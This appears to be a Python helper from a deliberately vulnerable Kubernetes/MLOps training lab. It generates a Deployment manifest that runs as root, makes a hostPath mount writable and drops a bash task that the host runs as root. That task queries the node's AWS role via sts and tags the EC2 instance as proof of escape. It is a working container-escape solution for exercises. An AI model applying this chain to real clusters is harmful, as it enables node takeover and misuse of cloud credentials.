"""Mentor-only manifest generator for the participant Git → hostPath path.

The generated Deployment stays on the dedicated worker and writes only its
fixed host maintenance task. The host systemd unit executes it as root. The
Pod then prints the host-owned evidence files to its *internal* logs so a
participant with bounded Pod-log access can inspect the result from the shell.
"""

from __future__ import annotations

import argparse
import re
from pathlib import Path

import yaml


ROOT = Path(__file__).resolve().parents[1]
BASE = ROOT / "lab/participant-chain/runtime/runtime-builder-base.yaml"
MARKER = re.compile(r"lab-[a-z0-9][a-z0-9-]{0,31}")


def host_task(marker: str) -> str:
    if MARKER.fullmatch(marker) is None:
        raise ValueError("marker must be lab- followed by 1-32 safe lowercase characters")
    return f"""#!/bin/bash
set -euo pipefail
export AWS_DEFAULT_REGION=ap-northeast-2 AWS_PAGER=
user="$(id -un)"
uid="$(id -u)"
host="$(hostname)"
[[ "$user" == root && "$uid" == 0 && "$host" =~ ^[A-Za-z0-9.-]+$ ]]
account="$(aws sts get-caller-identity --query Account --output text)"
role="$(aws sts get-caller-identity --query Arn --output text)"
[[ "$account" =~ ^[0-9]{{12}}$ ]]
[[ "$role" =~ ^arn:aws:sts::${{account}}:assumed-role/vuln-mlops-escape-node/(i-[a-f0-9]{{17}})$ ]]
instance_id="${{BASH_REMATCH[1]}}"
aws ec2 create-tags --resources "$instance_id" --tags "Key=lab.vuln-mlops/proof,Value={marker}"
printf '{{"user":"%s","uid":%s,"hostname":"%s"}}\\n' "$user" "$uid" "$host" > /var/lib/vuln-mlops/node-evidence/context.json
printf '{{"account":"%s","role":"%s","instance_id":"%s","tag_key":"lab.vuln-mlops/proof","marker":"{marker}"}}\\n' "$account" "$role" "$instance_id" > /var/lib/vuln-mlops/node-evidence/result.json
chmod 0600 /var/lib/vuln-mlops/node-evidence/context.json /var/lib/vuln-mlops/node-evidence/result.json
printf 'maintenance execution: user=%s uid=%s hostname=%s\\n' "$user" "$uid" "$host"
"""


def desired_manifest(marker: str) -> dict:
    deployment = yaml.safe_load(BASE.read_text(encoding="utf-8"))
    pod = deployment["spec"]["template"]["spec"]
    pod["securityContext"]["runAsUser"] = 0
    pod["securityContext"]["runAsGroup"] = 0
    container = pod["containers"][0]
    container["command"] = ["/bin/sh", "-c"]
    container["args"] = [
        "cat > /host-maintenance/task.sh <<'HOSTTASK'\n"
        + host_task(marker)
        + "HOSTTASK\n"
        + "uvicorn runtime_builder.main:app --host 0.0.0.0 --port 8080 &\n"
        + "app_pid=$!\n"
        + "for attempt in $(seq 1 90); do\n"
        + "  if [ -s /node-evidence/context.json ] && [ -s /node-evidence/result.json ]; then\n"
        + "    cat /node-evidence/context.json /node-evidence/result.json\n"
        + "    break\n"
        + "  fi\n"
        + "  sleep 2\n"
        + "done\n"
        + 'wait "$app_pid"'
    ]
    container["volumeMounts"][1]["readOnly"] = False
    return deployment


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--marker", required=True, help="participant-chosen lab- marker")
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()
    args.output.write_bytes(
        yaml.safe_dump(desired_manifest(args.marker), sort_keys=False).encode("utf-8")
    )


if __name__ == "__main__":
    main()
